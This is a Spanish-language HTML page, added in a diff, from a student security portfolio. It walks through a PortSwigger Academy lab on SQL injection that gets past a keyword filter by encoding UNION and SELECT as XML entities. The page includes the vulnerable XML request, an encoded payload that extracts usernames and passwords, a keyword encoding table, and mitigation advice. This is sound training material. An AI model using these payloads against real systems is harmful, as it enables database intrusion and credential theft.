@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab 18</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <h1>Lab 18</h1>
+        <nav>
+            <ul>
+                <li><a href="pd03.html">← Volver al roadmap</a></li>
+                <li><a href="#lab">Laboratorio</a></li>
+                <li><a href="#procedimiento">Procedimiento</a></li>
+                <li><a href="#evidencia">Evidencia</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <!-- LABORATORIO 18 -->
+    <section id="lab">
+        <h2>Lab18: SQL injection with filter bypass via XML encoding</h2>
+        
+        <table>
+            <tr>
+                <th>Nivel</th>
+                <td>Practitioner</td>
+            </tr>
+            <tr>
+                <th>Tipo de SQLi</th>
+                <td>In-band SQLi (Bypass via XML Encoding)</td>
+            </tr>
+        </table>
+
+        <h3>Objetivo</h3>
+        <p>Obtener las credenciales de la tabla <strong>users</strong> (usuario y contraseña del administrador) evadiendo un filtro de seguridad que bloquea palabras clave SQL mediante el uso de codificación XML.</p>
+
+        <h3>Vulnerabilidad</h3>
+        <p>La aplicación recibe datos en formato XML a través de una petición POST. El filtro de seguridad (WAF/IPS) busca palabras como <strong>UNION</strong> o <strong>SELECT</strong> en texto plano, pero no inspecciona entidades codificadas dentro del XML.</p>
+        
+        <p>Esto permite al atacante ofuscar el payload mediante entidades XML (decimales o hexadecimales) para evadir el filtro. La base de datos decodifica automáticamente las entidades antes de ejecutar la consulta, por lo que el ataque tiene éxito a pesar del filtro.</p>
+        
+        <p><strong>Nota importante:</strong> Este laboratorio requiere la versión <strong>Professional</strong> de Burp Suite o el uso de extensiones como "Hackvertor" para codificar automáticamente los payloads. Con la versión Community se puede realizar manualmente, pero el proceso es más tedioso.</p>
+    </section>
+
+    <!-- PROCEDIMIENTO -->
+    <section id="procedimiento">
+        <h2>Procedimiento</h2>
+        
+        <div style="background-color: #1e293b; padding: 20px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #f59e0b;">
+            <p><strong>Nota:</strong> En el documento original se menciona que este laboratorio requiere la versión Professional de Burp Suite o extensiones como Hackvertor. A continuación se explica el procedimiento teórico y manual para evadir el filtro mediante codificación XML.</p>
+        </div>
+        
+        <ol>
+            <li>
+                <strong>Localizar la funcionalidad vulnerable</strong>. En este laboratorio, la aplicación tiene una función de verificación de stock que envía datos en XML. Por ejemplo, al hacer clic en "Check stock" para un producto, se envía una petición POST con contenido XML.
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px; margin-top: 10px;">POST /product/stock HTTP/1.1
+Content-Type: application/xml
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;stockCheck&gt;
+    &lt;productId&gt;1&lt;/productId&gt;
+    &lt;storeId&gt;1&lt;/storeId&gt;
+&lt;/stockCheck&gt;</pre>
+            </li>
+            <li>
+                <strong>Probar una inyección simple</strong> en el tag <strong>&lt;storeId&gt;</strong> para confirmar la vulnerabilidad:
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">&lt;storeId&gt;1 UNION SELECT NULL&lt;/storeId&gt;</pre>
+                <p>Es probable que el filtro bloquee esta petición debido a la palabra "UNION".</p>
+            </li>
+            <li>
+                <strong>Ofuscar el payload mediante entidades XML</strong>. Codificar las palabras reservadas en entidades decimales o hexadecimales:
+                
+                <p><strong>Ejemplo de codificación hexadecimal:</strong></p>
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">
+U -> &#x55;
+N -> &#x4e;
+I -> &#x49;
+O -> &#x4f;
+N -> &#x4e;
+S -> &#x53;
+E -> &#x45;
+L -> &#x4c;
+C -> &#x43;
+T -> &#x54;</pre>
+                
+                <p>La palabra <strong>UNION</strong> codificada en hexadecimal sería: <strong>&#x55;&#x4e;&#x49;&#x4f;&#x4e;</strong></p>
+                <p>La palabra <strong>SELECT</strong> codificada sería: <strong>&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;</strong></p>
+            </li>
+            <li>
+                <strong>Construir el payload ofuscado</strong> para extraer las credenciales:
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">&lt;storeId&gt;1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username, password FROM users&lt;/storeId&gt;</pre>
+            </li>
+            <li>
+                <strong>Enviar la petición</strong> con el payload codificado. El filtro no detecta las palabras clave porque están representadas como entidades XML, pero la base de datos las decodifica antes de ejecutar la consulta.
+            </li>
+            <li>
+                <strong>Observar la respuesta</strong>. Si la inyección es exitosa, la respuesta contendrá los nombres de usuario y contraseñas de la tabla users.
+            </li>
+            <li>
+                <strong>Identificar las credenciales del administrador</strong> en la respuesta.
+            </li>
+            <li>
+                <strong>Iniciar sesión</strong> con las credenciales obtenidas para resolver el laboratorio.
+            </li>
+        </ol>
+
+        <h3>Payload ofuscado completo</h3>
+        <pre style="background-color: #1e293b; padding: 15px; border-radius: 8px; font-size: 1.1rem; white-space: pre-wrap;">&lt;storeId&gt;1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username, password FROM users&lt;/storeId&gt;</pre>
+        
+        <h4>Explicación del payload</h4>
+        <ul>
+            <li><strong>&lt;storeId&gt;1</strong>: Valor original del ID de tienda, seguido de un espacio.</li>
+            <li><strong>&#x55;&#x4e;&#x49;&#x4f;&#x4e;</strong>: Representación hexadecimal de la palabra "UNION". El filtro no la detecta porque no es texto plano.</li>
+            <li><strong>&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;</strong>: Representación hexadecimal de la palabra "SELECT".</li>
+            <li><strong>username, password FROM users</strong>: Parte del payload que no necesita codificación porque no contiene palabras clave bloqueadas (aunque "FROM" y "users" podrían codificarse también si fuera necesario).</li>
+            <li><strong>&lt;/storeId&gt;</strong>: Cierre de la etiqueta XML.</li>
+        </ul>
+
+        <h4>Funcionamiento del bypass</h4>
+        <p>El filtro de seguridad (WAF/IPS) analiza el tráfico HTTP en busca de patrones de ataque conocidos. Al ver el payload:</p>
+        <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">1 UNION SELECT username, password FROM users</pre>
+        <p>el filtro detecta las palabras "UNION" y "SELECT" y bloquea la petición.</p>
+        
+        <p>Sin embargo, al enviar el payload codificado:</p>
+        <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username, password FROM users</pre>
+        <p>el filtro no reconoce las entidades XML como palabras clave. Cuando el servidor procesa el XML, las entidades se decodifican automáticamente antes de que la consulta llegue a la base de datos, por lo que la base de datos recibe el payload original sin codificar y lo ejecuta.</p>
+
+        <h4>Tabla de codificaciones útiles</h4>
+        <table style="width:100%; margin-top:15px;">
+            <thead>
+                <tr>
+                    <th>Palabra</th>
+                    <th>Entidades hexadecimales</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr><td>UNION</td><td>&#x55;&#x4e;&#x49;&#x4f;&#x4e;</td></tr>
+                <tr><td>SELECT</td><td>&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;</td></tr>
+                <tr><td>FROM</td><td>&#x46;&#x52;&#x4f;&#x4d;</td></tr>
+                <tr><td>WHERE</td><td>&#x57;&#x48;&#x45;&#x52;&#x45;</td></tr>
+                <tr><td>INSERT</td><td>&#x49;&#x4e;&#x53;&#x45;&#x52;&#x54;</td></tr>
+                <tr><td>UPDATE</td><td>&#x55;&#x50;&#x44;&#x41;&#x54;&#x45;</td></tr>
+                <tr><td>DELETE</td><td>&#x44;&#x45;&#x4c;&#x45;&#x54;&#x45;</td></tr>
+            </tbody>
+        </table>
+    </section>
+
+    <!-- EVIDENCIA TÉCNICA -->
+    <section id="evidencia">
+   
+
+        <h3>Verificación del ataque</h3>
+        <p>La vulnerabilidad se confirmaría al observar que:</p>
+        <ul>
+            <li>La petición con el payload codificado no es bloqueada por el filtro.</li>
+            <li>La respuesta HTTP contiene los nombres de usuario y contraseñas de la tabla users.</li>
+            <li>Las credenciales del administrador aparecen en la respuesta.</li>
+        </ul>
+        
+        <p>Ejemplo de respuesta esperada:</p>
+        <pre style="background-color: #1e293b; padding: 15px; border-radius: 8px;">
+administrator: 8fg5h2j1k4m9p3q7r2s5
+carlos: password123
+wiener: passw0rd
+        </pre>
+        
+        <p>Esto demostraría que:</p>
+        <ul>
+            <li>Los filtros basados únicamente en detección de palabras clave son insuficientes.</li>
+            <li>La codificación de payloads puede evadir WAFs y sistemas de prevención.</li>
+            <li>Es posible ejecutar ataques SQLi incluso en presencia de filtros superficiales.</li>
+        </ul>
+        
+        <p>Una vez obtenidas las credenciales, se inicia sesión como administrator, resolviendo el laboratorio.</p>
+        
+        <div style="background-color: #1e293b; padding: 15px; border-radius: 8px; margin-top: 20px;">
+            <p><strong>Resultado esperado:</strong> El laboratorio se resuelve correctamente al evadir el filtro mediante codificación XML e iniciar sesión como administrator, apareciendo el mensaje "Congratulations, you solved the lab!" en la interfaz de PortSwigger Academy.</p>
+        </div>
+    </section>
+
+    <!-- MITIGACIÓN RECOMENDADA -->
+    <section>
+        <h2>Mitigación recomendada</h2>
+        
+        <h4>Validar y Desinfectar después de la Decodificación</h4>
+        <p>Los filtros de seguridad deben aplicarse después de decodificar los datos, no antes. Cualquier validación de entrada debe realizarse sobre los datos ya procesados y decodificados, no sobre el XML crudo.</p>
+        
+        <h4>Consultas Preparadas (Parameterized Queries)</h4>
+        <p>Implementar consultas parametrizadas es la defensa principal, independientemente de cómo se codifiquen los datos. Al usar parámetros, incluso si el atacante logra evadir el filtro, los datos no se interpretarán como código SQL.</p>
+        <pre style="background-color: #1e293b; padding: 15px; border-radius: 8px;">SELECT * FROM products WHERE store_id = ?</pre>
+        
+        <h4>Lista Blanca de Caracteres Permitidos</h4>
+        <p>Para campos numéricos como storeId, validar estrictamente que el contenido sea solo dígitos después de la decodificación XML. Rechazar cualquier valor que contenga letras o caracteres especiales.</p>
+        
+        <h4>Deshabilitar Entidades Externas XML</h4>
+        <p>Configurar el procesador XML para deshabilitar la resolución de entidades externas y la expansión de entidades generales. Esto también ayuda a prevenir ataques XXE (XML External Entity).</p>
+        
+        <h4>Validación de Esquema XML</h4>
+        <p>Implementar validación contra un esquema XML (XSD) que defina estrictamente la estructura y tipos de datos esperados. Rechazar cualquier XML que no cumpla con el esquema.</p>
+        
+        <h4>Principio de Menor Privilegio</h4>
+        <p>La cuenta de base de datos debe tener permisos mínimos, limitando el acceso a tablas sensibles como users.</p>
+        
+        <h4>WAF con Decodificación Profunda</h4>
+        <p>Utilizar WAFs que realicen decodificación profunda (deep decoding) de protocolos como XML antes de aplicar las reglas de detección.</p>
+        
+        <h4>Escapado de Caracteres Especiales</h4>
+        <p>Como defensa adicional en profundidad, escapar correctamente los caracteres especiales SQL, aunque esto no sea suficiente si no se usan consultas preparadas.</p>
+    </section>
+
+    <!-- REFERENCIA AL DOCUMENTO ORIGINAL -->
+    <section style="background-color: #0f172a; border: 1px solid #334155;">
+       <p><a href="act08-Equipo1.pdf" class="btn-blog" style="margin-top: 10px; display: inline-block;" download>Descargar PDF completo</a></p>
+    </section>
+
+    <!-- NAVEGACIÓN ENTRE LABORATORIOS -->
+    <section style="display: flex; justify-content: space-between; margin-top: 30px;">
+        <a href="pd03-lab17.html" class="btn-blog">← Laboratorio anterior (Lab 17)</a>
+        <a href="pd03.html" class="btn-blog">Volver al roadmap →</a>
+    </section>
+
+    <footer>
+        <p>  Slugish – Portafolio de Seguridad Informática</p>
+        <p>GitHub: <a href="https://github.com/sluggishpoem" target="_blank">github.com/sluggishpoem</a></p>
+    </footer>
+</body>
+</html>
